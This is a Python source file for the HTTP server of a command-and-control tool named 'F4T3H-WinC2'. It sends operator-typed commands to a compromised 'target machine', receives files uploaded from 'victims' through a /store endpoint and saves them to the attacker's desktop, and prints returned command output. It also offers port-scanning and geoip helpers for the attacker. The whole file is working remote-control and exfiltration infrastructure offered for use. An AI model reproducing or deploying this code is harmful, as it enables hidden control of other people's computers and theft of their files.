import http.server
from os import system
import cgi
from termcolor import colored

## remove the following 
from Configurations import DESKTOP_PATH
from helper import help_handeler
from Functions import*


class ServerHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        """[summary]"""
        
        attacker_side_commands = ["port_scanner", "geoip", "terminate", "help"]
        # getting commands from the attacker
        command = input(colored(f"F4T3H-WinC2 >> ", "green"))
        if command.split(" ")[0] in attacker_side_commands:
            if "help" in command:
                help_handeler()

            elif "port_scanner" in command:
                com = command[13:]
                host, ports = com.split(":")
                print(host, ports)
                port_scanner(host, ports)

            elif "geoip" in command:
                host = check_host(command[6::])
                ip_lookup(host)

            elif "terminate" in command:
                return

        else:   # sending the command to the target machine.
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(command.encode())


    def do_POST(self):

        if self.path == '/store':
            try:
                content_type, _ = cgi.parse_header(self.headers.get('content-type'))
                if content_type == 'multipart/form-data':
                    getting_file = cgi.FieldStorage(fp = self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print(colored('[-] Unexpected POST request', 'red'))
                # Getting files from victims machins into yours.
                client_file = getting_file['file']
                file_content = client_file.file.read()
                # reading file name from the attacker.
                incomming_file_name = input(colored("\nSave file as >> ", "red"))
                print()
                # Download file path
                DFP = f'{DESKTOP_PATH}/{incomming_file_name}'
                with open(DFP, 'wb') as file_object:
                    print(colored(f'[+] Writing {colored(incomming_file_name, "yellow")} file ..', 'green'))
                    file_object.write(file_content)
                    self.send_response(200)
                    self.end_headers()
                # check if the file was downloaded successfully
                if os.path.isfile(DFP):
                    print(colored("[+]", "green"), "File was downloaded successfully\n")
                else:
                    print(colored("[-]", "red"), f"An error was occurred while downloading the {incomming_file_name}\n")
            except Exception as e:
                print(colored(f"Error MSG:\n{e}\n", "red"))
            return
        # return html status code 200
        self.send_response(200)
        self.end_headers()
        # it return string by default so we will casting/converting it to integer
        length = int(self.headers['Content-length'])
        post_value = self.rfile.read(length)
        # displaying command outputs.
        print(colored(post_value.decode(), "green"))


def HTTPHandlerFunc(host, port):
    server_class = http.server.HTTPServer
    # you can read more: https://docs.python.org/3/library/http.server.html
    httpd = server_class((host, port), ServerHandler)
    system("clear")
    print(colored(f"[-] Starting HTTP server @ {host}:{port}", "green"))
    print(colored("[+] Wating for incomming connections. . .", "yellow"))
    httpd.serve_forever()
    system("clear")
    


# TODO: adding HTTPS
